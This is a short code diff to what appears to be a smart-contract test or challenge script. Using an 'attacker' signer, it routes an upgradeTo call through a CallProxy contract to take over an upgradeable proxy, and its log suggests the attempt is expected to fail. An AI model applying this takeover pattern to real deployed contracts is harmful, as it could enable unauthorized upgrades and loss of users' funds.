@@ -4,16 +4,17 @@ import { callProxyAddr, getAttacker, upgradeProxyAddr } from "../utils"
 async function main() {
     const attacker = getAttacker()
     const CallProxy = await ethers.getContractAt("CallProxy", callProxyAddr)
-    const UpgradeProxy = await ethers.getContractAt("UpgradeProxyImplementation", upgradeProxyAddr)
+    const UpgradeProxy = await ethers.getContractAt("TransparentUpgradeableProxy", upgradeProxyAddr)
 
     const tx = await CallProxy.connect(attacker).proxy(
         upgradeProxyAddr,
-        UpgradeProxy.interface.encodeFunctionData("initialize", [attacker.address]),
+        UpgradeProxy.interface.encodeFunctionData("upgradeTo", [attacker.address]),
         {
             gasLimit: 100000,
         }
     )
-    console.log(`fail internal initialize tx sent: ${tx.hash}`)
+    console.log(`fail internal upgradeTo tx sent: ${tx.hash}`)
+    await tx.wait()
 }
 
 main()
